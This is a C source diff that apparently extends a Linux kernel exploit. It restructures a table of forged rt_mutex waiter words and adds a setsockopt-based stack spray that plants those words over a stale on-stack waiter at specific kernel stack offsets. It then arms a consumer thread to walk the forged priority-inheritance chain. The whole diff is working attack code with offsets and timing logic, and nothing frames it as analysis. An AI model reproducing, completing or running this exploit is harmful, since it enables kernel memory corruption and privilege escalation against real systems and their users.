@@ -46,6 +46,15 @@ static int slide_pselect_production_stack;
 #endif
 static int slide_pselect_nfds = PSELECT_ROUTE_NFDS;
 static int slide_syscall_pad;
+
+#define SLIDE_MAX_WAITER_WORDS 16
+struct slide_waiter_word {
+  int word;
+  uint64_t value;
+  const char *name;
+};
+static struct slide_waiter_word slide_waiter_words[SLIDE_MAX_WAITER_WORDS];
+static int slide_waiter_word_count;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 int slide_p0_session_fresh;
 #endif
@@ -178,12 +187,7 @@ void slide_pselect_put_waiter_word(
   }
 }
 
-void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
-  FD_ZERO(in);
-  FD_ZERO(out);
-  FD_ZERO(ex);
-
-  int words_per_set = slide_pselect_words_per_set();
+void slide_build_waiter_words(void) {
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   uintptr_t stack_tree_parent = slide_oracle_parent;
@@ -213,11 +217,7 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   slide_pselect_production_stack = 0;
 #endif
 #endif
-  struct slide_waiter_word {
-    int word;
-    uint64_t value;
-    const char *name;
-  } words[] = {
+  struct slide_waiter_word words[] = {
 #if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -299,10 +299,25 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {13, 0, "ww_ctx"},
 #endif
   };
+  slide_waiter_word_count = 0;
   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
-    struct slide_waiter_word *w = &words[i];
+    if (slide_waiter_word_count < SLIDE_MAX_WAITER_WORDS) {
+      slide_waiter_words[slide_waiter_word_count++] = words[i];
+    }
+  }
+}
+
+void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
+  FD_ZERO(in);
+  FD_ZERO(out);
+  FD_ZERO(ex);
+
+  int words_per_set = slide_pselect_words_per_set();
+  slide_build_waiter_words();
+  for (size_t i = 0; i < (size_t)slide_waiter_word_count; i++) {
     slide_pselect_put_waiter_word(
-        in, out, ex, words_per_set, w->word, w->value, w->name);
+        in, out, ex, words_per_set, slide_waiter_words[i].word,
+        slide_waiter_words[i].value, slide_waiter_words[i].name);
   }
 }
 
@@ -437,6 +452,98 @@ void slide_pselect_stack_copy(void) {
   close(pipefd[0]);
   close(pipefd[1]);
 }
+
+#if defined(SLIDE_USE_SETSO_SPRAY) && SLIDE_USE_SETSO_SPRAY
+void slide_setsockopt_stack_copy(void) {
+  if (!page_base || !fake_lock || !fake_w0) {
+    pr_error("slide setsockopt missing kernel page base=%016zx lock=%016zx "
+             "w0=%016zx\n",
+             page_base, fake_lock, fake_w0);
+    return;
+  }
+
+  /*
+   * ip_setsockopt() optname SLIDE_SETSO_SPRAY_OPTNAME zeroes a
+   * SLIDE_SETSO_SPRAY_COPY_LEN-byte stack buffer at T-0x4f8 and copies it
+   * from user without any capability check.  The stale on-stack
+   * rt_mutex_waiter sits at T-0x4b8 = buffer + SLIDE_SETSO_SPRAY_WAITER_OFF,
+   * so the same words the pselect route would plant land exactly on it.  The
+   * handler then fails validation (buffer[0x20] != 2, we leave it zeroed) and
+   * returns -EINVAL; the planted words persist on the popped stack.  We only
+   * arm the consumer trigger after observing the EINVAL, so a policy-denied
+   * spray (EACCES/EPERM) never lets the PI walk hit garbage.
+   */
+  slide_build_waiter_words();
+  unsigned char buf[SLIDE_SETSO_SPRAY_COPY_LEN];
+  memset(buf, 0, sizeof(buf));
+  for (int i = 0; i < slide_waiter_word_count; i++) {
+    size_t off = SLIDE_SETSO_SPRAY_WAITER_OFF + (size_t)i * 8;
+    if (off + 8 > sizeof(buf)) {
+      pr_warning("slide setsockopt waiter word %d exceeds buffer off=%zu\n",
+                 i, off);
+      break;
+    }
+    memcpy(buf + off, &slide_waiter_words[i].value, 8);
+  }
+
+  int fd = (int)syscall(SYS_socket, AF_INET, SOCK_DGRAM, 0);
+  if (fd < 0) {
+    pr_error("slide setsockopt socket errno=%d\n", errno);
+    return;
+  }
+
+  atomic_store(&slide_consume_stop, 0);
+  atomic_store(&slide_consume_go, 0);
+  atomic_store(&slide_consume_seen, 0);
+  atomic_store(&slide_consume_lost, 0);
+  atomic_store(&slide_consume_enter_sched, 0);
+  atomic_store(&slide_consume_calls, 0);
+  atomic_store(&slide_consume_sched_ok, 0);
+  atomic_store(&slide_consume_last_sched_ret, -1);
+  atomic_store(&slide_consume_last_sched_errno, 0);
+  atomic_store(&slide_pselect_write_window, 0);
+
+  for (int index = 0; index < slide_syscall_pad; index++) {
+    syscall(SYS_gettid);
+  }
+  errno = 0;
+  int ret = (int)syscall(SYS_setsockopt, fd, SLIDE_SETSO_SPRAY_LEVEL,
+                         SLIDE_SETSO_SPRAY_OPTNAME, buf,
+                         SLIDE_SETSO_SPRAY_COPY_LEN);
+  int saved_errno = errno;
+  if (ret != -1 || saved_errno != EINVAL) {
+    pr_error("slide setsockopt spray not accepted ret=%d errno=%d; "
+             "trigger skipped\n",
+             ret, saved_errno);
+    close(fd);
+    return;
+  }
+
+  atomic_store(&slide_consume_go, 1);
+  size_t spray_done = gettime_ns();
+  while (!atomic_load(&slide_consume_stop)) {
+    __asm__ volatile("yield" ::: "memory");
+  }
+  size_t spray_elapsed_usec =
+      (gettime_ns() - spray_done) / 1000ULL;
+
+  pr_info("slide setsockopt spray returned ret=%d errno=%d elapsed_usec=%zu "
+          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
+          "last_sched_ret=%d last_sched_errno=%d\n",
+          ret, saved_errno, spray_elapsed_usec,
+          atomic_load(&slide_consumer_ready),
+          atomic_load(&slide_consume_seen),
+          atomic_load(&slide_consume_enter_sched),
+          atomic_load(&slide_consume_calls),
+          atomic_load(&slide_consume_sched_ok),
+          atomic_load(&slide_consume_last_sched_ret),
+          atomic_load(&slide_consume_last_sched_errno));
+  atomic_store(&slide_pselect_write_window,
+               atomic_load(&slide_consume_sched_ok) > 0);
+
+  close(fd);
+}
+#endif
 
 #if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
 static long slide_read_task_syscall_nr(int tid) {
@@ -701,8 +808,13 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   }
   pr_info("slide stage owner_acquired\n");
 
+#if defined(SLIDE_USE_SETSO_SPRAY) && SLIDE_USE_SETSO_SPRAY
+  slide_setsockopt_stack_copy();
+  pr_info("slide stage setsockopt copy returned\n");
+#else
   slide_pselect_stack_copy();
   pr_info("slide stage pselect copy returned\n");
+#endif
   atomic_store(&slide_route_done, 1);
 
   for (;;) {
